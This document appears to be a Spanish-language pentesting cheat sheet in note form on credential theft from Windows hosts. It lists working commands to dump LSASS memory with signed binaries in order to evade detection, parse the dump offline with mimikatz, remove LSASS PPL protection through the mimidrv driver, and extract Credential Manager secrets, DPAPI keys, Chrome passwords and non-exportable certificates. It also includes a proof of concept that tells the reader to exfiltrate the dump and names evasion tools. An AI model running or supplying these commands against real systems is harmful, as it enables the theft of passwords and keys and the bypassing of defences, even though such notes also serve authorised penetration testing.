---
aliases:
  - Mimikatz LSASS Dump
  - Mimikatz PPL Bypass
  - Mimikatz DPAPI
tags:
  - technique/credential-access
  - technique/defense-evasion
  - env/windows
  - tool/mimikatz
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[Mimikatz Cheatsheet]]"
  - "[[LSASS Dumping]]"
  - "[[DPAPI Abuse]]"
  - "[[Credential Guard Bypass]]"
---
# Mimikatz - Dump y PPL Bypass

> Dumpear LSASS sin ejecutar mimikatz on-host (parse offline), bypass de PPL, y DPAPI/crypto.

---

## Dump de LSASS + Parse Offline

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| `rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\Temp\lsass.dmp full` | Dump de LSASS con binario firmado (LOLBin) | Evadir detección de mimikatz. |
| `procdump.exe -accepteula -ma lsass.exe lsass.dmp` | Dump con ProcDump (Sysinternals firmado) | Alternativa. |
| `mimikatz # sekurlsa::minidump lsass.dmp` + `sekurlsa::logonpasswords` | Parse del dump **offline** (en tu máquina) | No corrés mimikatz en el target. |
^mimi-dump

## Bypass PPL (LSASS protegido)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| `!+` | Carga el driver `mimidrv.sys` (firmado) | LSASS corre como PPL (RunAsPPL=1). |
| `!processprotect /process:lsass.exe /remove` | Quita la protección PPL de LSASS | Antes de dumpear. |
| `sekurlsa::logonpasswords` | Dump tras quitar PPL | Con PPL removido. |
| `!processprotect /process:lsass.exe` + `!-` | Restaura PPL + descarga el driver | Cleanup. |
^mimi-ppl

## DPAPI y Crypto

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| `vault::cred /patch` | Credentials del Credential Manager | Secrets guardados. |
| `dpapi::masterkey /in:"...\Protect\SID\GUID" /rpc` | Descifra masterkey DPAPI vía el DC | [[DPAPI Abuse]]. |
| `dpapi::chrome /in:"...\Login Data" /unprotect` | Passwords de Chrome | Browser creds. |
| `crypto::certificates /export` | Exporta certs del store (incl. no-exportables con `/patch`) | Auth PKINIT/RDP/VPN. |
^mimi-dpapi

### PoC dump offline (sin mimikatz en target)

```cmd
rundll32 C:\Windows\System32\comsvcs.dll, MiniDump <PID_LSASS> C:\Temp\lsass.dmp full
:: Exfiltrar lsass.dmp y parsear en tu máquina:
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

> [!tip] Alternativas modernas
> `pypykatz` (parse offline en Python), `nanodump` (CS, evade Defender), `Dumpert` (direct syscalls), `SafetyKatz`. Si hay **Credential Guard**, el dump viene vacío → [[Credential Guard Bypass]].
